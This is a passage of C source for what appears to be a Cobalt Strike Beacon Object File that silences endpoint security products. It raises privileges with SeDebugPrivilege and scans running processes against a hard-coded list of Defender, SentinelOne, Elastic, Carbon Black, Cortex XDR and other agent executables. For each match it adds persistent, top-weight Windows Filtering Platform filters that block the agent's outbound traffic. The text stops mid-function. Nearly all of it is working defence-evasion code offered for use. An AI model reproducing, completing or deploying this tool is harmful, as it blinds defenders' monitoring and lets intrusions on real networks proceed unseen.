#include <windows.h>
#include <initguid.h>
#include <fwpmu.h>
#include <stdio.h>
#include <tlhelp32.h>


typedef enum ErrorCode {
    CUSTOM_SUCCESS = 0,
    CUSTOM_FILE_NOT_FOUND = 0x1,
    CUSTOM_MEMORY_ALLOCATION_ERROR = 0x2,
    CUSTOM_NULL_INPUT = 0x3,
    CUSTOM_DRIVE_NAME_NOT_FOUND = 0x4,
    CUSTOM_FAILED_TO_GET_DOS_DEVICE_NAME = 0x5,
} ErrorCode;

#define FWPM_FILTER_FLAG_PERSISTENT (0x00000001)
#define FWPM_PROVIDER_FLAG_PERSISTENT (0x00000001)


#ifdef BOF
#include "beacon.h"
#include "utils.c"

#ifndef bufsize
#define bufsize 8192
#endif

DECLSPEC_IMPORT void __cdecl MSVCRT$memset(void* dest, int c, size_t count);
DECLSPEC_IMPORT void* __cdecl  MSVCRT$memcpy(LPVOID, LPVOID, size_t);
DECLSPEC_IMPORT void* __cdecl MSVCRT$malloc(size_t size);
DECLSPEC_IMPORT void* __cdecl MSVCRT$calloc(size_t number, size_t size);
DECLSPEC_IMPORT void __cdecl MSVCRT$free(void* _Memory);
DECLSPEC_IMPORT int WINAPI MSVCRT$vsnprintf(char* buffer, size_t count, const char* format, va_list arg);
DECLSPEC_IMPORT int WINAPI MSVCRT$swprintf_s(wchar_t* buffer, size_t sizeOfBuffer, const wchar_t* format, ...);

DECLSPEC_IMPORT void* WINAPI KERNEL32$HeapAlloc(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$HeapFree(HANDLE, DWORD, PVOID);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetProcessHeap();
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateToolhelp32Snapshot(DWORD dwFlags, DWORD th32ProcessID);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$Process32FirstW(HANDLE hSnapshot, LPPROCESSENTRY32W lppe);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$Process32NextW(HANDLE hSnapshot, LPPROCESSENTRY32W lppe);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$OpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
DECLSPEC_IMPORT VOID WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetLastError(VOID);
DECLSPEC_IMPORT HLOCAL WINAPI KERNEL32$LocalAlloc(UINT, SIZE_T);
DECLSPEC_IMPORT HLOCAL WINAPI KERNEL32$LocalFree(HLOCAL);
DECLSPEC_IMPORT int WINAPI KERNEL32$WideCharToMultiByte(UINT CodePage, DWORD dwFlags, LPCWCH lpWideCharStr, int cchWideChar, LPSTR lpMultiByteStr, int cbMultiByte, LPCCH lpDefaultChar, LPBOOL lpUsedDefaultChar);
DECLSPEC_IMPORT int WINAPI KERNEL32$MultiByteToWideChar(UINT CodePage, DWORD dwFlags, LPCCH lpMultiByteStr, int cbMultiByte, LPWSTR lpWideCharStr, int cchWideChar);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetFileAttributesW(LPCWSTR lpFileName);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$QueryDosDeviceW(LPCWSTR, LPWSTR, DWORD);
DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$LoadLibraryA(LPCSTR lpLibFileName);
DECLSPEC_IMPORT FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE hModule, LPCSTR lpProcName);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$QueryFullProcessImageNameW(HANDLE, DWORD, LPWSTR, PDWORD);

WINADVAPI PDWORD  WINAPI ADVAPI32$GetSidSubAuthority(PSID, DWORD);
WINADVAPI PUCHAR  WINAPI ADVAPI32$GetSidSubAuthorityCount(PSID);
WINADVAPI BOOL WINAPI ADVAPI32$AdjustTokenPrivileges(HANDLE TokenHandle, BOOL DisableAllPrivileges, PTOKEN_PRIVILEGES NewState, DWORD BufferLength, PTOKEN_PRIVILEGES PreviousState, PDWORD ReturnLength);
WINADVAPI BOOL WINAPI ADVAPI32$LookupPrivilegeValueA(LPCSTR lpSystemName, LPCSTR lpName, PLUID lpLuid);
WINADVAPI BOOL WINAPI ADVAPI32$OpenProcessToken(HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle);
WINADVAPI BOOL WINAPI ADVAPI32$OpenThreadToken(HANDLE, DWORD, BOOL, PHANDLE TokenHandle);
WINADVAPI BOOL WINAPI ADVAPI32$GetTokenInformation(HANDLE TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, LPVOID TokenInformation, DWORD TokenInformationLength, PDWORD ReturnLength);


#define memcpy MSVCRT$memcpy
#define memset MSVCRT$memset
#define malloc MSVCRT$malloc
#define calloc MSVCRT$calloc
#define free MSVCRT$free
#define vsnprintf MSVCRT$vsnprintf
#define swprintf_s MSVCRT$swprintf_s
#define intAlloc(size) KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, size)
#define intFree(addr) KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, addr)
#define intZeroMemory(addr,size) MSVCRT$memset((addr),0,size)

#define CreateToolhelp32Snapshot KERNEL32$CreateToolhelp32Snapshot
#define Process32FirstW KERNEL32$Process32FirstW
#define Process32NextW KERNEL32$Process32NextW
#define OpenProcess KERNEL32$OpenProcess
#define CloseHandle KERNEL32$CloseHandle
#define GetLastError KERNEL32$GetLastError
#define LocalAlloc KERNEL32$LocalAlloc
#define LocalFree KERNEL32$LocalFree
#define WideCharToMultiByte KERNEL32$WideCharToMultiByte
#define MultiByteToWideChar KERNEL32$MultiByteToWideChar
#define GetFileAttributesW KERNEL32$GetFileAttributesW
#define QueryDosDeviceW KERNEL32$QueryDosDeviceW
#define LoadLibraryA KERNEL32$LoadLibraryA
#define GetProcAddress KERNEL32$GetProcAddress
#define QueryFullProcessImageNameW KERNEL32$QueryFullProcessImageNameW

#define GetSidSubAuthority ADVAPI32$GetSidSubAuthority
#define GetSidSubAuthorityCount ADVAPI32$GetSidSubAuthorityCount
#define AdjustTokenPrivileges ADVAPI32$AdjustTokenPrivileges
#define LookupPrivilegeValueA ADVAPI32$LookupPrivilegeValueA
#define OpenThreadToken ADVAPI32$OpenThreadToken
#define OpenProcessToken ADVAPI32$OpenProcessToken
#define GetTokenInformation ADVAPI32$GetTokenInformation

#if defined(_MSC_VER)
#pragma data_seg(".data")
__declspec(allocate(".data"))
char* output = 0;  // this is just done so its we don't go into .bss which isn't handled properly

#pragma data_seg(".data")
__declspec(allocate(".data"))
WORD currentoutsize = 0;

#pragma data_seg(".data")
__declspec(allocate(".data"))
HANDLE trash = NULL; // Needed for x64 to not give relocation error

#elif defined(__GNUC__)
char* output __attribute__((section(".data"))) = 0;  // this is just done so its we don't go into .bss which isn't handled properly
WORD currentoutsize __attribute__((section(".data"))) = 0;
HANDLE trash __attribute__((section(".data"))) = NULL; // Needed for x64 to not give relocation error
#endif

int bofstart();
void internal_printf(const char* format, ...);
void printoutput(BOOL done);

int bofstart() {
    output = (char*)calloc(bufsize, 1);
    currentoutsize = 0;
    return 1;
}

void internal_printf(const char* format, ...) {
    int buffersize = 0;
    int transfersize = 0;
    char* curloc = NULL;
    char* intBuffer = NULL;
    va_list args;
    va_start(args, format);
    buffersize = vsnprintf(NULL, 0, format, args);
    va_end(args);

    if (buffersize == -1)
        return;

    char* transferBuffer = (char*)intAlloc(bufsize);
    intBuffer = (char*)intAlloc(buffersize);
    va_start(args, format);
    vsnprintf(intBuffer, buffersize, format, args);
    va_end(args);
    if (buffersize + currentoutsize < bufsize)
    {
        memcpy(output + currentoutsize, intBuffer, buffersize);
        currentoutsize += buffersize;
    }
    else {
        curloc = intBuffer;
        while (buffersize > 0)
        {
            transfersize = bufsize - currentoutsize;
            if (buffersize < transfersize)
            {
                transfersize = buffersize;
            }
            memcpy(output + currentoutsize, curloc, transfersize);
            currentoutsize += transfersize;
            if (currentoutsize == bufsize)
            {
                printoutput(FALSE);
            }
            memset(transferBuffer, 0, transfersize);
            curloc += transfersize;
            buffersize -= transfersize;
        }
    }
    intFree(intBuffer);
    intFree(transferBuffer);
}

void printoutput(BOOL done) {
    char* msg = NULL;
    BeaconOutput(CALLBACK_OUTPUT, output, currentoutsize);
    currentoutsize = 0;
    memset(output, 0, bufsize);
    if (done) { free(output); output = NULL; }
}

#else
#include "utils.h"

#define intAlloc(size) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, size)
#define intFree(addr) HeapFree(GetProcessHeap(), 0, addr)
#define intZeroMemory(addr,size) memset((addr),0,size)
#define internal_printf(...) { \
	fprintf(stdout, __VA_ARGS__); \
}

#endif

#define NtCurrentProcess()  ((HANDLE)(LONG_PTR)-1)
#define NtCurrentThread()   ((HANDLE)(LONG_PTR)-2)

typedef DWORD(WINAPI* pFwpmEngineOpen0)(const wchar_t* serverName, UINT32 authnService, SEC_WINNT_AUTH_IDENTITY_W* authIdentity, const FWPM_SESSION0* session, HANDLE* engineHandle);
typedef DWORD(WINAPI* pFwpmFilterCreateEnumHandle0)(HANDLE engineHandle, const FWPM_FILTER_ENUM_TEMPLATE0* enumTemplate, HANDLE* enumHandle);
typedef DWORD(WINAPI* pFwpmProviderCreateEnumHandle0)(HANDLE engineHandle, const FWPM_PROVIDER_ENUM_TEMPLATE0* enumTemplate, HANDLE* enumHandle);
typedef DWORD(WINAPI* pFwpmProviderEnum0)(HANDLE, HANDLE, UINT32, FWPM_PROVIDER0***, UINT32*);
typedef DWORD(WINAPI* pFwpmProviderDestroyEnumHandle0)(HANDLE, HANDLE);
typedef DWORD(WINAPI* pFwpmProviderAdd0)(HANDLE, const FWPM_PROVIDER0*, PSECURITY_DESCRIPTOR);
typedef DWORD(WINAPI* pFwpmFilterAdd0)(HANDLE, const FWPM_FILTER0*, PSECURITY_DESCRIPTOR, UINT64*);
typedef DWORD(WINAPI* pFwpmFilterEnum0)(HANDLE, HANDLE, UINT32, FWPM_FILTER0***, UINT32*);
typedef DWORD(WINAPI* pFwpmFilterDestroyEnumHandle0)(HANDLE, HANDLE);
typedef DWORD(WINAPI* pFwpmFilterDeleteById0)(HANDLE, UINT64);
typedef DWORD(WINAPI* pFwpmProviderDeleteByKey0)(HANDLE, const GUID*);
typedef VOID(WINAPI* pFwpmFreeMemory0)(void** p);
typedef DWORD(WINAPI* pFwpmEngineClose0)(HANDLE);

typedef struct _FWPUCLNT_FUNCTION {
    pFwpmEngineOpen0 FwpmEngineOpen0;
    pFwpmFilterCreateEnumHandle0 FwpmFilterCreateEnumHandle0;
    pFwpmProviderCreateEnumHandle0 FwpmProviderCreateEnumHandle0;
    pFwpmProviderEnum0 FwpmProviderEnum0;
    pFwpmProviderDestroyEnumHandle0 FwpmProviderDestroyEnumHandle0;
    pFwpmProviderAdd0 FwpmProviderAdd0;
    pFwpmFilterAdd0 FwpmFilterAdd0;
    pFwpmFilterEnum0 FwpmFilterEnum0;
    pFwpmFilterDestroyEnumHandle0 FwpmFilterDestroyEnumHandle0;
    pFwpmFilterDeleteById0 FwpmFilterDeleteById0;
    pFwpmProviderDeleteByKey0 FwpmProviderDeleteByKey0;
    pFwpmFreeMemory0 FwpmFreeMemory0;
    pFwpmEngineClose0 FwpmEngineClose0;
} FWPUCLNT_FUNCTION, * PFWPUCLNT_FUNCTION;

VOID InitAPI(PFWPUCLNT_FUNCTION fwp)
{
    HMODULE pModule = LoadLibraryA("FWPUCLNT.DLL");
    if (pModule == NULL)
    {
        internal_printf("[-] Load FWPUCLNT failed with error code: 0x%x.\n", GetLastError());
        return;
    }

    fwp->FwpmEngineOpen0 = (pFwpmEngineOpen0)GetProcAddress(pModule, "FwpmEngineOpen0");
    if (!fwp->FwpmEngineOpen0) return;

    fwp->FwpmFilterCreateEnumHandle0 = (pFwpmFilterCreateEnumHandle0)GetProcAddress(pModule, "FwpmFilterCreateEnumHandle0");
    if (!fwp->FwpmFilterCreateEnumHandle0) return;

    fwp->FwpmProviderCreateEnumHandle0 = (pFwpmProviderCreateEnumHandle0)GetProcAddress(pModule, "FwpmProviderCreateEnumHandle0");
    if (!fwp->FwpmProviderCreateEnumHandle0) return;

    fwp->FwpmProviderEnum0 = (pFwpmProviderEnum0)GetProcAddress(pModule, "FwpmProviderEnum0");
    if (!fwp->FwpmProviderEnum0) return;

    fwp->FwpmFreeMemory0 = (pFwpmFreeMemory0)GetProcAddress(pModule, "FwpmFreeMemory0");
    if (!fwp->FwpmFreeMemory0) return;

    fwp->FwpmProviderDestroyEnumHandle0 = (pFwpmProviderDestroyEnumHandle0)GetProcAddress(pModule, "FwpmProviderDestroyEnumHandle0");
    if (!fwp->FwpmProviderDestroyEnumHandle0) return;

    fwp->FwpmEngineClose0 = (pFwpmEngineClose0)GetProcAddress(pModule, "FwpmEngineClose0");
    if (!fwp->FwpmEngineClose0) return;

    fwp->FwpmProviderAdd0 = (pFwpmProviderAdd0)GetProcAddress(pModule, "FwpmProviderAdd0");
    if (!fwp->FwpmProviderAdd0) return;

    fwp->FwpmFilterEnum0 = (pFwpmFilterEnum0)GetProcAddress(pModule, "FwpmFilterEnum0");
    if (!fwp->FwpmFilterEnum0) return;

    fwp->FwpmFilterDestroyEnumHandle0 = (pFwpmFilterDestroyEnumHandle0)GetProcAddress(pModule, "FwpmFilterDestroyEnumHandle0");
    if (!fwp->FwpmFilterDestroyEnumHandle0) return;

    fwp->FwpmFilterDeleteById0 = (pFwpmFilterDeleteById0)GetProcAddress(pModule, "FwpmFilterDeleteById0");
    if (!fwp->FwpmFilterDeleteById0) return;

    fwp->FwpmProviderDeleteByKey0 = (pFwpmProviderDeleteByKey0)GetProcAddress(pModule, "FwpmProviderDeleteByKey0");
    if (!fwp->FwpmProviderDeleteByKey0) return;

    fwp->FwpmFilterAdd0 = (pFwpmFilterAdd0)GetProcAddress(pModule, "FwpmFilterAdd0");
    if (!fwp->FwpmFilterAdd0) return;
}

BOOL CheckProcessIntegrityLevel()
{
    HANDLE hToken = NULL;
    DWORD dwLength = 0;
    PTOKEN_MANDATORY_LABEL pTIL = NULL;
    DWORD dwIntegrityLevel = 0;
    BOOL isHighIntegrity = FALSE;

    if (!OpenThreadToken(NtCurrentThread(), TOKEN_QUERY, TRUE, &hToken)) {
        if (GetLastError() != ERROR_NO_TOKEN) {
            internal_printf("[-] OpenThreadToken failed with error code: 0x%x.\n", GetLastError());
            return FALSE;
        }

        if (!OpenProcessToken(NtCurrentProcess(), TOKEN_QUERY, &hToken)) {
            internal_printf("[-] OpenProcessToken failed with error code: 0x%x.\n", GetLastError());
            return FALSE;
        }
    }

    // Get the size of the integrity level information
    if (!GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &dwLength) &&
        GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
        internal_printf("[-] GetTokenInformation failed with error code: 0x%x.\n", GetLastError());
        CloseHandle(hToken);
        return FALSE;
    }

    pTIL = (PTOKEN_MANDATORY_LABEL)LocalAlloc(LPTR, dwLength);
    if (pTIL == NULL) {
        internal_printf("[-] LocalAlloc failed with error code: 0x%x.\n", GetLastError());
        CloseHandle(hToken);
        return FALSE;
    }

    if (!GetTokenInformation(hToken, TokenIntegrityLevel, pTIL, dwLength, &dwLength)) {
        internal_printf("[-] GetTokenInformation failed with error code: 0x%x.\n", GetLastError());
        LocalFree(pTIL);
        CloseHandle(hToken);
        return FALSE;
    }

    if (pTIL->Label.Sid == NULL || *GetSidSubAuthorityCount(pTIL->Label.Sid) < 1) {
        internal_printf("[-] SID structure is invalid.\n");
        LocalFree(pTIL);
        CloseHandle(hToken);
        return FALSE;
    }

    dwIntegrityLevel = *GetSidSubAuthority(pTIL->Label.Sid, (DWORD)(UCHAR)(*GetSidSubAuthorityCount(pTIL->Label.Sid) - 1));

    if (dwIntegrityLevel >= SECURITY_MANDATORY_HIGH_RID) {
        isHighIntegrity = TRUE;
    }
    else {
        internal_printf("[-] This program requires to run in high integrity level.\n");
    }

    LocalFree(pTIL);
    CloseHandle(hToken);
    return isHighIntegrity;
}

// Enable SeDebugPrivilege to obtain full path of running processes
BOOL EnableSeDebugPrivilege()
{
    HANDLE hToken = NULL;
    TOKEN_PRIVILEGES tokenPrivileges = { 0 };

    if (!OpenThreadToken(NtCurrentThread(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, TRUE, &hToken)) {
        if (GetLastError() != ERROR_NO_TOKEN) {
            internal_printf("[-] OpenThreadToken failed with error code: 0x%x.\n", GetLastError());
            return FALSE;
        }

        if (!OpenProcessToken(NtCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken)) {
            internal_printf("[-] OpenProcessToken failed with error code: 0x%x.\n", GetLastError());
            return FALSE;
        }
    }

    if (!LookupPrivilegeValueA(NULL, "SeDebugPrivilege", &tokenPrivileges.Privileges[0].Luid)) {
        internal_printf("[-] LookupPrivilegeValueA failed with error code: 0x%x.\n", GetLastError());
        CloseHandle(hToken);
        return FALSE;
    }

    tokenPrivileges.PrivilegeCount = 1;
    tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
        internal_printf("[-] AdjustTokenPrivileges failed with error code: 0x%x.\n", GetLastError());
        CloseHandle(hToken);
        return FALSE;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        internal_printf("[-] Failed to get SeDebugPrivilege. You might not be able to get the process handle of the EDR process.\n");
        CloseHandle(hToken);
        return FALSE;
    }

    CloseHandle(hToken);
    return TRUE;
}

void CharArrayToWCharArray(const char charArray[], WCHAR wCharArray[], size_t wCharArraySize) {
    int result = MultiByteToWideChar(CP_UTF8, 0, charArray, -1, wCharArray, wCharArraySize);

    if (result == 0) {
        internal_printf("[-] MultiByteToWideChar failed with error code: 0x%x.\n", GetLastError());
        wCharArray[0] = L'\0';
    }
}

BOOL GetDriveName(PCWSTR filePath, wchar_t* driveName, size_t driveNameSize) {
    if (!filePath) {
        return FALSE;
    }
    const wchar_t* colon = my_wcschr(filePath, L':');
    if (colon && (colon - filePath + 1) < driveNameSize) {
        my_wcsncpy(driveName, filePath, colon - filePath + 1);
        driveName[colon - filePath + 1] = L'\0';
        return TRUE;
    }
    else {
        return FALSE;
    }
}

ErrorCode ConvertToNtPath(PCWSTR filePath, wchar_t* ntPathBuffer, size_t bufferSize) {
    WCHAR driveName[10];
    WCHAR ntDrivePath[MAX_PATH];
    if (!filePath || !ntPathBuffer) {
        return CUSTOM_NULL_INPUT;
    }

    if (!GetDriveName(filePath, driveName, sizeof(driveName) / sizeof(WCHAR))) {
        return CUSTOM_DRIVE_NAME_NOT_FOUND;
    }

    if (QueryDosDeviceW(driveName, ntDrivePath, sizeof(ntDrivePath) / sizeof(WCHAR)) == 0) {
        return CUSTOM_FAILED_TO_GET_DOS_DEVICE_NAME;
    }

    LPCWSTR drivePath = filePath + my_wcslen(driveName);

    swprintf_s(ntPathBuffer, bufferSize, L"%ls%ls", ntDrivePath, drivePath);

    for (size_t i = 0; ntPathBuffer[i] != L'\0'; ++i) {
        ntPathBuffer[i] = my_towlower(ntPathBuffer[i]);
    }
    return CUSTOM_SUCCESS;
}

BOOL FileExists(PCWSTR filePath) {
    if (!filePath) {
        return FALSE;
    }

    DWORD fileAttrib = GetFileAttributesW(filePath);
    if (fileAttrib == INVALID_FILE_ATTRIBUTES) {
        return FALSE;
    }

    return TRUE;
}

ErrorCode CustomFwpmGetAppIdFromFileName0(PCWSTR filePath, FWP_BYTE_BLOB** appId) {
    if (!FileExists(filePath)) {
        return CUSTOM_FILE_NOT_FOUND;
    }

    WCHAR ntPath[MAX_PATH];
    ErrorCode errorCode = ConvertToNtPath(filePath, ntPath, sizeof(ntPath));
    if (errorCode != CUSTOM_SUCCESS) {
        return errorCode;
    }
    *appId = (FWP_BYTE_BLOB*)malloc(sizeof(FWP_BYTE_BLOB));
    if (!*appId) {
        return CUSTOM_MEMORY_ALLOCATION_ERROR;
    }

    (*appId)->size = my_wcslen(ntPath) * sizeof(WCHAR) + sizeof(WCHAR);

    (*appId)->data = (UINT8*)malloc((*appId)->size);
    if (!(*appId)->data) {
        free(*appId);
        return CUSTOM_MEMORY_ALLOCATION_ERROR;
    }
    memcpy((*appId)->data, ntPath, (*appId)->size);
    return CUSTOM_SUCCESS;
}

void FreeAppId(FWP_BYTE_BLOB* appId) {
    if (appId) {
        if (appId->data) {
            free(appId->data);
        }
        free(appId);
    }
}

// Get provider GUID by description
BOOL GetProviderGUIDByDescription(PCWSTR providerDescription, GUID* outProviderGUID, PFWPUCLNT_FUNCTION fwp) {
    DWORD result = 0;
    HANDLE hEngine = NULL;
    HANDLE enumHandle = NULL;
    FWPM_PROVIDER0** providers = NULL;
    UINT32 numProviders = 0;

    result = fwp->FwpmEngineOpen0(NULL, RPC_C_AUTHN_DEFAULT, NULL, NULL, &hEngine);
    if (result != ERROR_SUCCESS) {
        internal_printf("[-] FwpmEngineOpen0 failed with error code: 0x%x.\n", result);
        return FALSE;
    }

    result = fwp->FwpmProviderCreateEnumHandle0(hEngine, NULL, &enumHandle);
    if (result != ERROR_SUCCESS) {
        internal_printf("[-] FwpmProviderCreateEnumHandle0 failed with error code: 0x%x.\n", result);
        fwp->FwpmEngineClose0(hEngine);
        return FALSE;
    }

    result = fwp->FwpmProviderEnum0(hEngine, enumHandle, 100, &providers, &numProviders);
    if (result != ERROR_SUCCESS) {
        internal_printf("[-] FwpmProviderEnum0 failed with error code: 0x%x.\n", result);
        fwp->FwpmEngineClose0(hEngine);
        return FALSE;
    }

    BOOL found = FALSE;
    for (UINT32 i = 0; i < numProviders; i++) {
        if (providers[i]->displayData.description != NULL) {
            if (_wcscmp(providers[i]->displayData.description, providerDescription) == 0) {
                *outProviderGUID = providers[i]->providerKey;
                found = TRUE;
                break;
            }
        }
    }

    if (providers) {
        fwp->FwpmFreeMemory0((void**)&providers);
    }

    fwp->FwpmProviderDestroyEnumHandle0(hEngine, enumHandle);
    fwp->FwpmEngineClose0(hEngine);
    return found;
}

// Check if the running process is our list
BOOL isInEdrProcessList(const wchar_t* procName) {
    wchar_t* edrProcess[] = {
        // Microsoft Defender for Endpoint and Microsoft Defender Antivirus
        L"MsMpEng.exe",
        L"MsSense.exe",
        L"SenseIR.exe",
        L"SenseNdr.exe",
        L"SenseCncProxy.exe",
        L"SenseSampleUploader.exe",
        // Elastic EDR
        L"winlogbeat.exe",
        L"elastic-agent.exe",
        L"elastic-endpoint.exe",
        L"filebeat.exe",
        // Trellix EDR
        L"xagt.exe",
        // Qualys EDR
        L"QualysAgent.exe",
        // SentinelOne
        L"SentinelAgent.exe",
        L"SentinelAgentWorker.exe",
        L"SentinelServiceHost.exe",
        L"SentinelStaticEngine.exe",
        L"LogProcessorService.exe",
        L"SentinelStaticEngineScanner.exe",
        L"SentinelHelperService.exe",
        L"SentinelBrowserNativeHost.exe",
        // Cylance
        L"CylanceSvc.exe",
        // Cybereason
        L"AmSvc.exe",
        L"CrAmTray.exe",
        L"CrsSvc.exe",
        L"ExecutionPreventionSvc.exe",
        L"CybereasonAV.exe",
        // Carbon Black EDR
        L"cb.exe",
        // Carbon Black Cloud
        L"RepMgr.exe",
        L"RepUtils.exe",
        L"RepUx.exe",
        L"RepWAV.exe",
        L"RepWSC.exe",
        // Tanium
        L"TaniumClient.exe",
        L"TaniumCX.exe",
        L"TaniumDetectEngine.exe",
        // Palo Alto Networks Traps/Cortex XDR
        L"Traps.exe",
        L"cyserver.exe",
        L"CyveraService.exe",
        L"CyvrFsFlt.exe",
        // FortiEDR
        L"fortiedr.exe",
        // Cisco Secure Endpoint (Formerly Cisco AMP)
        L"sfc.exe",
        // ESET Inspect
        L"EIConnector.exe",
        L"ekrn.exe",
        // Harfanglab EDR
        L"hurukai.exe",
        //TrendMicro Apex One
        L"CETASvc.exe",
        L"WSCommunicator.exe",
        L"EndpointBasecamp.exe",
        L"TmListen.exe",
        L"Ntrtscan.exe",
        L"TmWSCSvc.exe",
        L"PccNTMon.exe",
        L"TMBMSRV.exe",
        L"CNTAoSMgr.exe",
        L"TmCCSF.exe"
    };

    int count = sizeof(edrProcess) / sizeof(edrProcess[0]);
    for (int i = 0; i < count; i++) {
        if (StringCompareIW(procName, edrProcess[i]) == 0) {
            return TRUE;
        }
    }
    return FALSE;
}

// Add WFP filters for all known EDR process(s)
void BlockEdrProcessTraffic(PFWPUCLNT_FUNCTION fwp, WCHAR* filterName, WCHAR* providerName, WCHAR* providerDescription) {
    DWORD result = 0;
    BOOL isEdrDetected = FALSE;
    HANDLE hEngine = NULL;
    HANDLE hProcessSnap = NULL;
    HANDLE hModuleSnap = NULL;
    PROCESSENTRY32W pe32 = { 0 };
    pe32.dwSize = sizeof(PROCESSENTRY32W);

    // d78e1e87-8644-4ea5-9437-d809ecefc971
    const GUID GUID_FWPM_CONDITION_ALE_APP_ID = {
        0xd78e1e87,
        0x8644,
        0x4ea5,
        {0x94, 0x37, 0xd8, 0x09, 0xec, 0xef, 0xc9, 0x71 }
    };

    // c38d57d1-05a7-4c33-904f-7fbceee60e82
    const GUID GUID_FWPM_LAYER_ALE_AUTH_CONNECT_V4 = {
        0xc38d57d1,
        0x05a7,
        0x4c33,
        {0x90, 0x4f, 0x7f, 0xbc, 0xee, 0xe6, 0x0e, 0x82}
    };

    // 4a72393b-319f-44bc-84c3-ba54dcb3b6b4
    const GUID GUID_FWPM_LAYER_ALE_AUTH_CONNECT_V6 = {
        0x4a72393b,
        0x319f,
        0x44bc,
        {0x84, 0xc3, 0xba, 0x54, 0xdc, 0xb3, 0xb6, 0xb4}
    };

    result = fwp->FwpmEngineOpen0(NULL, RPC_C_AUTHN_DEFAULT, NULL, NULL, &hEngine);
    if (result != ERROR_SUCCESS) {
        internal_printf("[-] FwpmEngineOpen0 failed with error code: 0x%x.\n", result);
        return;
    }

    EnableSeDebugPrivilege();

    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        internal_printf("[-] CreateToolhelp32Snapshot (of processes) failed with error code: 0x%x.\n", GetLastError());
        return;
    }

    BOOL bFind = Process32FirstW(hProcessSnap, &pe32);
    while (bFind)
    {
        if (isInEdrProcessList(pe32.szExeFile)) {
            isEdrDetected = TRUE;
            internal_printf("Detected running EDR process: %ls (%d):\n", pe32.szExeFile, pe32.th32ProcessID);

            // Get full path of the running process
            HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe32.th32ProcessID);
            if (hProcess) {
                WCHAR fullPath[MAX_PATH] = { 0 };
                DWORD size = MAX_PATH;
                FWPM_FILTER_CONDITION0 cond = { 0 };
                FWPM_FILTER0 filter = { 0 };
                FWPM_PROVIDER0 provider = { 0 };
                GUID providerGuid = { 0 };
                FWP_BYTE_BLOB* appId = NULL;
                UINT64 filterId = 0;
                ErrorCode errorCode = CUSTOM_SUCCESS;

                QueryFullProcessImageNameW(hProcess, 0, fullPath, &size);
                errorCode = CustomFwpmGetAppIdFromFileName0(fullPath, &appId);
                if (errorCode != CUSTOM_SUCCESS) {
                    switch (errorCode) {
                    case CUSTOM_FILE_NOT_FOUND:
                        internal_printf("    [-] CustomFwpmGetAppIdFromFileName0 failed to convert the \"%S\" to app ID format. The file path cannot be found.\n", fullPath);
                        break;
                    case CUSTOM_MEMORY_ALLOCATION_ERROR:
                        internal_printf("    [-] CustomFwpmGetAppIdFromFileName0 failed to convert the \"%S\" to app ID format. Error occurred in allocating memory for appId.\n", fullPath);
                        break;
                    case CUSTOM_NULL_INPUT:
                        internal_printf("    [-] CustomFwpmGetAppIdFromFileName0 failed to convert the \"%S\" to app ID format. Please check your input.\n", fullPath);
                        break;
                    case CUSTOM_DRIVE_NAME_NOT_FOUND:
                        internal_printf("    [-] CustomFwpmGetAppIdFromFileName0 failed to convert the \"%S\" to app ID format. The drive name cannot be found.\n", fullPath);
                        break;
                    case CUSTOM_FAILED_TO_GET_DOS_DEVICE_NAME:
                        internal_printf("    [-] CustomFwpmGetAppIdFromFileName0 failed to convert the \"%S\" to app ID format. Failed to convert drive name to DOS device name.\n", fullPath);
                        break;
                    default:
                        break;
                    }
                    CloseHandle(hProcess);
                    continue;
                }

                // Sett up WFP filter and condition
                filter.displayData.name = filterName;
                filter.flags = FWPM_FILTER_FLAG_PERSISTENT;
                filter.layerKey = GUID_FWPM_LAYER_ALE_AUTH_CONNECT_V4;
                filter.action.type = FWP_ACTION_BLOCK;
                UINT64 weightValue = 0xFFFFFFFFFFFFFFFF;
                filter.weight.type = FWP_UINT64;
                filter.weight.uint64 = &weightValue;
                cond.fieldKey = GUID_FWPM_CONDITION_ALE_APP_ID;
                cond.matchType = FWP_MATCH_EQUAL;
                cond.conditionValue.type = FWP_BYTE_BLOB_TYPE;
                cond.conditionValue.byteBlob = appId;
                filter.filterCondition = &cond;
                filter.numFilterConditions = 1;

                // Add WFP provider for the filter
                if (GetProviderGUIDByDescription(providerDescription, &providerGuid, fwp)) {
                    filter.providerKey = &providerGuid;
                }
                else {
                    provider.displayData.name = providerName;
                    provider.displayData.description = providerDescription;
                    provider.flags = FWPM_PROVIDER_FLAG_PERSISTENT;
                    result = fwp->FwpmProviderAdd0(hEngine, &provider, NULL);
                    if (result != ERROR_SUCCESS) {
                        internal_printf("    [-] FwpmProviderAdd0 failed with error code: 0x%x.\n", result);
                    }
                    else {
                        if (GetProviderGUIDByDescription(providerDescription, &providerGuid, fwp)) {
